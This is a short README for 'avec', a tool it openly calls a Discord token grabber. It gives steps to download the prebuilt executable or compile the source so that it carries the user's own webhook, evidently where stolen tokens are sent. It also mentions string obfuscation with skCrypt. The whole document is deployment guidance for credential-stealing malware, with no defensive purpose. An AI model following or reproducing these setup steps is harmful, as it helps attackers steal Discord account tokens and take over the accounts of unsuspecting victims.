# avec
A small self-patch Discord token grabber

## Usage
### *Without Compiler*
1. Download `avec.exe` from `https://github.com/juvoy/avec/releases`
1. Create a text file called `info.txt`
2. Paste your Discord webhook into the file
3. Drag the file `info.txt` into `avec.exe`
4. You should now have a `avec.exe` with your webhook
### *With Compiler*
  You will need
+ Visual Studio 2022 (v143)

1. Open `main.cpp`
2. You will find `#define WEBHOOK_URL skCrypt("EXAMPLE_HOOK")` somewhere at the top
3. Change `EXAMPLE_HOOK` to your webhook
4. Compile it in **release** and x64
